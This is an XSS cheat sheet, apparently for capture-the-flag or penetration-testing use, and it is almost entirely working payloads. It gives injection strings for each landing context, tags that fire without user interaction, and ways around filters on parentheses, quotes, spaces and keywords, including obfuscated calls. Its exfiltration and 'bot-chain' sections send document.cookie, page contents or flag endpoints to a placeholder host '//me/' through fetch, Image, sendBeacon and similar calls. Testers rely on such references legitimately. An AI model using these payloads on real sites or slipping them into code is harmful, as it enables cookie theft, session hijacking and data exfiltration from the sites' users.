# XSS cheatsheet — the field-manual quick-reference

The working tables — what to fire, where, with what. Pull the
row matching the context; deeper detail lives in the named file.

---

## The context → first-payload table

| Landing context | First payload | File |
|---|---|---|
| HTML body | `<img src=x onerror=alert(1)>` | html-context.md |
| `"` attribute | `"><img src=x onerror=alert(1)>` | attribute-context.md |
| `'` attribute | `'><svg onload=alert(1)>` | attribute-context.md |
| unquoted attr | `x onfocus=alert(1) autofocus` | attribute-context.md |
| `href`/`src`/`action` | `javascript:alert(1)` | protocols.md |
| JS string `"` | `";alert(1);//` | js-context.md |
| JS string `'` | `';alert(1);//` | js-context.md |
| template literal | `${alert(1)}` | js-context.md |
| JS block comment | `*/alert(1);//` | js-context.md |
| JS line comment | `%0aalert(1)//` | js-context.md |
| `<title>` | `</title><img src=x onerror=alert(1)>` | html-context.md |
| `<textarea>` | `</textarea><svg onload=alert(1)>` | html-context.md |
| `<style>` | `</style><img src=x onerror=alert(1)>` | html-context.md |
| `<!-- -->` | `--><img src=x onerror=alert(1)>` | html-context.md |
| DOM innerHTML | `<img src=x onerror=alert(1)>` | dom-xss.md |
| DOM eval | `alert(1)` | dom-xss.md |
| DOM location | `javascript:alert(1)` | dom-xss.md |
| DOM jQuery .html() | `<script>alert(1)</script>` | dom-xss.md |
| postMessage sink | per-listener shape | postmessage.md |
| stored field | `<img src=x onerror=alert(1)>` | stored-xss.md |
| markdown link | `[a](javascript:alert(1))` | markdown-render.md |
| uploaded .svg | `<svg onload=alert(1)>` | upload-xss.md |
| Angular {{}} | `{{constructor.constructor('alert(1)')()}}` | framework-sinks.md |
| Vue v-html | `<img src=x onerror=alert(1)>` | framework-sinks.md |

---

## The autofire tag shortlist — no interaction needed

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<iframe src=javascript:alert(1)>
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
```

---

## The "no parentheses" set — when `()` are filtered

```javascript
alert`1`
eval`alert(1)`
setTimeout`alert(1)`
Function`alert(1)`
onerror=alert;throw 1
```

---

## The "no quotes" set — when `'`/`"` die

```javascript
alert(1)
alert(document.domain)
alert(document.cookie)
alert(location.hash.slice(1))
alert(name)
eval(String.fromCharCode(97,108,101,114,116,40,49,41))
<img src=`x` onerror=alert(1)>      -- backtick-quoted attr
<img src=x onerror=alert`1`>
```

---

## The "no spaces" set — whitespace filtered in tags

```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
<img\tsrc=x\tonerror=alert(1)>
<img\nsrc=x\nonerror=alert(1)>
```

---

## The keyword-block bypasses — 'script'/'alert'/'onerror' filtered

```javascript
// 'alert' blocked:
onerror=confirm(1) / prompt(1) / eval(atob('YWxlcnQoMSk='))
onerror=eval(String.fromCharCode(...))
onerror=top[/al/.source+/ert/.source](1)
onerror=location.hash.slice(1)      -- hash-carried code

// 'script' blocked:
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<iframe src=javascript:alert(1)>
<scr<script>ipt>alert(1)</scr</script>ipt>
<ScRiPt>alert(1)</ScRiPt>

// 'onerror' blocked:
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<svg onload=alert(1)>
```

---

## The exfil channel shortlist — CSP-aware

```javascript
new Image().src='//me/?c='+document.cookie      -- img-src gate
fetch('//me/?c='+document.cookie)                -- connect-src gate
navigator.sendBeacon('//me/',document.cookie)    -- connect-src
location='//me/?c='+document.cookie              -- always allowed
new WebSocket('wss://me/')...send(...)           -- connect-src ws:
fetch('/api/flag').then(r=>r.text()).then(t=>    -- same-origin
   fetch('//me/?f='+t))
// no-outbound → app-as-channel (exfil-methods.md §5)
```

---

## The bot-chain shortlist

```javascript
// flag in cookie:
onerror="new Image().src='//me/?c='+document.cookie"
// flag in DOM of the page:
onerror="fetch('//me/?f='+document.getElementById('flag').innerText)"
// flag on /flag endpoint:
onerror="fetch('/flag').then(r=>r.text()).then(t=>fetch('//me/?f='+t))"
// flag behind same-origin iframe:
// <iframe src=/flag onload="fetch('//me/?f='+this.contentDocument.body.innerText)">
```

---

## The marker contract

```text
XSS_PROBE_<rand>        -- the canonical marker
XSS_PROBE_<rand>_<ctx>  -- marker + context letter for multi-inject
```

The marker in the RAW response (not the DOM) is the evidence —
`XSS_PROBE_x` inside `<img onerror>` = confirmed; the same marker
as `&lt;img` = encoded-context.
